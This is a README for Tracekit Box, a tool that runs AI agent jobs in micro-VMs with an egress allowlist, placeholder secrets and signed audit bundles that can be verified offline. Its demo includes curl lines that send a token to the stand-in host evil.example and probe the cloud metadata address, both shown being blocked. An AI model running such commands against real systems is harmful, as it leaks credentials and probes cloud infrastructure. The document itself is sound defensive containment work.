# Tracekit Box

**Run your agents in Tracekit Box. They can't escape, can't steal your keys, and you can prove everything they did.**

Tracekit Box runs each AI agent job in its own Firecracker micro-VM on a Linux server or CI runner. Every way out of
the VM (commands, network, secrets, model calls, code changes) is a door that Box controls, and a
[Tracekit](https://github.com/Cygnux-Labs/Tracekit) signer the agent cannot reach decides and signs what happens at
each door. When the job ends, Box writes one `.tkb` bundle that anyone can verify offline with `tracekit verify`.

It is for teams whose agents change real systems: DevOps and SRE, and fintech and healthcare engineering teams that run
agents in CI and in production and need to show afterwards what those agents did.

This is v0. It works on one Linux host with KVM; it has no jailer or seccomp hardening yet, and a dev signer gives only
dev assurance. [docs/limits.md](docs/limits.md) lists every limit and [SECURITY.md](SECURITY.md) what Box guarantees and
what it does not.

**[How it works](#how-it-works) · [Requirements](#requirements) · [Install](#install) · [Demo](#demo) ·
[Verify a bundle](#verify-a-bundle) · [GitHub Action](#github-action) · [Python](#python) · [Docs](#docs)**

## How it works

```
 host: server or CI runner (trusted)                micro-VM (untrusted: the agent lives here)
 ┌────────────────────────────────────────┐ vsock  ┌────────────────────────────────────────┐
 │ tkbox daemon                           │◀──────▶│ tkbox-guest (PID 1): exec, files, diff │
 │  ├ egress proxy: allowlist, IP checks, │◀───────│ egress forwarder on 127.0.0.1:3128     │
 │  │  secret swap                        │        │ your agent, its tools, its model calls │
 │  ├ image builder (OCI image → ext4)    │        │ no network card                        │
 │  └ Tracekit client ──▶ Tracekit signer │        │ /workspace: a copy of your checkout    │
 └────────────────────────────────────────┘        └────────────────────────────────────────┘
```

Three trust domains:

- **The host** (trusted) runs `tkbox daemon`. It starts the VMs, owns the doors and keeps the secrets.
- **The VM** (untrusted) runs the agent. It has no network card: the only ways out are vsock ports the daemon serves.
  The host never trusts what the VM says about itself, only what passes through a door.
- **The Tracekit signer** runs in its own trust domain and holds the signing key. The agent can reach neither its socket
  nor the daemon's. Run it as a separate user or on a separate host to get more than dev assurance.

### The doors

Each box is one Tracekit run. Every door records into it.

| Door | What Box does | What the signed record shows |
|---|---|---|
| Commands | A command runs only through the guest agent, and only after the signer allows it | A `Bash` decision with the command line, then its exit status |
| Network | Every connection goes through the host proxy. Allowlisted hosts pass; any other host waits for a person to run `tkbox approve`; loopback, private, link-local and cloud metadata addresses are refused | A `WebFetch` decision per connection; Box approvals as `tkbox.approval` |
| Secrets | The VM only ever sees a placeholder such as `tkbox_GH_3f9c…`. The proxy swaps in the real value only on requests to the hosts the secret is bound to, and blocks a request that carries the placeholder to any other host it inspects | `tkbox.secret.use` and `tkbox.secret.leak` with the secret's name and host, never its value |
| Model calls | Model APIs are egress with a bound key (`ANTHROPIC_API_KEY` → `api.anthropic.com`) | The connection's `WebFetch` decision plus `tkbox.model.call` (host, path, status, bytes) |
| Code changes | The guest produces a git-format patch of `/workspace`. `tkbox apply` checks every path and asks the signer about each file before it writes anything to your checkout | A `Write` decision per file |
| Stop | A box timeout, `tkbox stop`, or the signer holding or quarantining the run pauses or kills the VM | The run's close reason |

**Fail closed.** No signer, no box: `tkbox daemon` refuses to start boxes when the signer does not answer (unless you
start it with `--unrecorded`, which warns and records nothing). A signer that stops answering refuses every later
command, connection and file write.

The design, protocols and disks are in [docs/architecture.md](docs/architecture.md).

## Requirements

- Linux on x86_64 or arm64 with `/dev/kvm` that the daemon's user can open: bare metal, a cloud VM with nested
  virtualization, or a GitHub-hosted `ubuntu-latest` runner (the [action](#github-action) enables KVM for you). On a Mac,
  use the Lima VM in [docs/development.md](docs/development.md).
- `e2fsprogs` (`mkfs.ext4`) to build disk images, and `git` to snapshot the workspace.
- A Tracekit 1.4.2 signer: `pip install tracekit-ai==1.4.2`. For a dev setup, `tracekit init --dev --v2 --no-hooks &&
  tracekit up` starts a same-user signer.
- Outbound HTTPS from the host to your image registry (Docker Hub or GHCR) and, on first use, to the pinned Firecracker
  and guest kernel downloads, which Box checks by SHA-256.
  <!-- TODO(lead): confirm against internal/assets: download source and whether first use fetches them. -->

## Install

Download `tkbox` and the guest agent for your architecture and put them side by side: `tkbox` looks for
`tkbox-guest-linux-<arch>` next to its own binary.

```sh
arch=$(uname -m); case "$arch" in x86_64) arch=amd64 ;; aarch64) arch=arm64 ;; esac
v=v0.1.0   # the release tag
base=https://github.com/Cygnux-Labs/tracekit-box/releases/download/$v
curl -fsSL -O "$base/tkbox-linux-$arch" -O "$base/tkbox-guest-linux-$arch"
sudo install -m 0755 "tkbox-linux-$arch" /usr/local/bin/tkbox
sudo install -m 0755 "tkbox-guest-linux-$arch" /usr/local/bin/
tkbox version
```
<!-- TODO(lead): first release tag; add a SHA256SUMS check once the release workflow publishes one. -->

Or build from source with Go (see [docs/development.md](docs/development.md)): `make linux` writes both binaries for
both architectures to `bin/`.

## Demo

A box with PyPI on its allowlist, your checkout in `/workspace`, and a GitHub token the box never sees. First a
same-user dev signer and a token:

```sh
tracekit init --dev --v2 --no-hooks && tracekit up
export GH_TOKEN=ghp_...   # any GitHub token
```

Then, from a git checkout:

```sh
tkbox daemon &                                   # signer must be running, else it refuses
tkbox run --image python:3.12-slim --allow pypi --workspace . --name demo --secret GH=env:GH_TOKEN@api.github.com
tkbox exec demo -- python -c 'print(1+1)'        # → 2, recorded as Bash
tkbox exec demo -- curl -sI https://example.com  # → blocked: not on the allowlist, waits for approval
tkbox exec demo -- pip install requests          # → allowed (pypi preset)
tkbox exec demo -- sh -c 'curl -s https://169.254.169.254/'   # → refused: link-local
tkbox exec demo -- sh -c 'curl -s -H "Authorization: Bearer $GH" https://evil.example'  # the token never leaves for an unbound host: the box only has a placeholder
tkbox exec demo -- sh -c 'curl -s -H "Authorization: Bearer $GH" https://api.github.com/user'  # real token swapped in
tkbox exec demo -- sh -c 'echo hi > /workspace/x.txt' && tkbox diff demo   # → patch shows x.txt
tkbox stop demo && tkbox export demo -o demo.tkb && tracekit verify demo.tkb --trust demo.trust.json   # → VERIFIED
```

What each step shows:

- **`curl` is not in `python:3.12-slim`.** Install it first with
  `tkbox exec demo -- sh -c 'apt-get update -q && apt-get install -y -q curl'`. That image is Debian, so its mirror
  must be on the allowlist: add `--allow deb.debian.org` to `tkbox run` (the `apt-ubuntu` preset covers Ubuntu images).
  [examples/demo.sh](examples/demo.sh) does this for you.
  <!-- TODO(lead): pick one: keep python:3.12-slim + deb.debian.org (as examples/demo.sh does), or switch the demo to an image that has curl. -->
- **`example.com`** is off the allowlist, so the proxy holds the connection and prints an approval id. Run
  `tkbox approvals` and `tkbox approve <id>` (or `tkbox reject <id>`) in another terminal on the host; nothing in the VM
  can answer it. Unanswered, it is refused after 2 minutes.
- **`169.254.169.254`** is the cloud metadata address. It is refused before any decision, whatever the allowlist says.
- **`$GH` inside the box is a placeholder**, not your token. `evil.example` does not resolve, so the proxy refuses it at
  once; a real host off the allowlist would wait for approval like `example.com`. Even if someone approved a connection
  to an unbound host, only the placeholder could leave, because the real value never enters the VM. With `--inspect all` the proxy also opens allowed HTTPS connections to unbound hosts and blocks a
  request that carries a placeholder (recorded as `tkbox.secret.leak`).
- **`api.github.com`** is the host `GH` is bound to, so the proxy opens that connection, swaps the real token into the
  request headers and records `tkbox.secret.use`.
  <!-- TODO(lead): confirm that a secret's bound hosts join the allowlist; otherwise this step needs --allow github. -->
- **`tkbox diff`** shows a git-format patch with `x.txt`. `tkbox apply demo` would ask the signer about `x.txt` and then
  write it to your checkout.
- **`tracekit verify`** checks the bundle offline and prints `Integrity: VERIFIED.` With the same-user dev signer the
  assurance line says dev: an agent running as your user could have reached the key. Inside a box it cannot, but the
  bundle only states what the signer's setup proves.

## Verify a bundle

`tkbox export <box> -o run.tkb` writes the bundle and the signer's trust file next to it. Anyone with both can check the
run offline, with no access to your host:

```sh
pip install tracekit-ai==1.4.2
tracekit verify run.tkb --trust run.trust.json          # exit 0: Integrity: VERIFIED.
tracekit verify run.tkb --trust run.trust.json --json   # the same report as JSON
```

A verified bundle proves that the record is intact and was signed by the signer the trust file pins. It does not prove
that the agent did nothing the doors could not see; see [SECURITY.md](SECURITY.md#what-box-does-not-guarantee). Pin the
trust file you expect (commit it, or keep it outside CI) rather than trusting the one shipped next to a bundle.

## GitHub Action

[`action/`](action/action.yml) runs an agent in a box on a GitHub-hosted runner: it enables KVM, starts a dev signer and
the daemon, runs Claude Code, Codex or a command in a box with your checkout, applies the changes it is allowed to make,
exports and verifies the bundle and uploads it as an artifact.

```yaml
jobs:
  fix:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: Cygnux-Labs/tracekit-box/action@v0.1.0
        with:
          agent: claude-code
          prompt: "Make the failing test in tests/test_parser.py pass. Do not change the test."
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
```

The API key reaches only the daemon on the runner; inside the box Claude Code sees a placeholder that works only for
`api.anthropic.com`. Inputs, outputs and the steps are in [action/action.yml](action/action.yml);
[examples/claude-code-fix.yml](examples/claude-code-fix.yml) opens a pull request from the applied changes, outside
the box.

## Python

[`sdk/python`](sdk/python) is a standard-library client of the daemon's API (Python 3.9 or newer):

```python
from tracekit_box import Client

c = Client()
c.create_box("python:3.12-slim", name="demo", allow=["pypi"], workspace=".")
print(c.exec("demo", ["python", "-c", "print(1+1)"]).stdout_text)   # 2
```

Install it from a checkout with `pip install ./sdk/python`.

## Docs

| Doc | What is in it |
|---|---|
| [docs/cli.md](docs/cli.md) | Every `tkbox` command and flag, and exit codes |
| [docs/config.md](docs/config.md) | `tkbox.yaml` reference |
| [docs/limits.md](docs/limits.md) | Every limit, what Box says when you hit it and what to do |
| [docs/architecture.md](docs/architecture.md) | Trust domains, doors, protocols, disks |
| [docs/development.md](docs/development.md) | Building, the Lima dev VM, unit and end-to-end tests |
| [SECURITY.md](SECURITY.md) | Threat model, guarantees, how to report a vulnerability |
| [examples/](examples) | `tkbox.yaml`, the demo script, a workflow that opens a fix PR |

## License

MIT. Copyright (c) 2026 Cygnux Labs.
